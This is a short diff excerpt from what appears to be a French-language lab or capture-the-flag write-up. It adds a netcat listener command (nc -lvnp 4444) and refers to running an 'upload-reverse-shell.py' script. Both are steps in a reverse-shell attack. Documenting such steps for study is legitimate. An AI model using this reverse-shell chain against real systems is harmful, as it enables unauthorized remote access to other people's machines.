@@ -192,7 +192,7 @@ if ($socket) {
 
 Puis, on lance netcat pour écouter les connexions entrantes:
 ```bash
-
+nc -lvnp 4444
 ```
 
 On exécute finalement le script `upload-reverse-shell.py`:
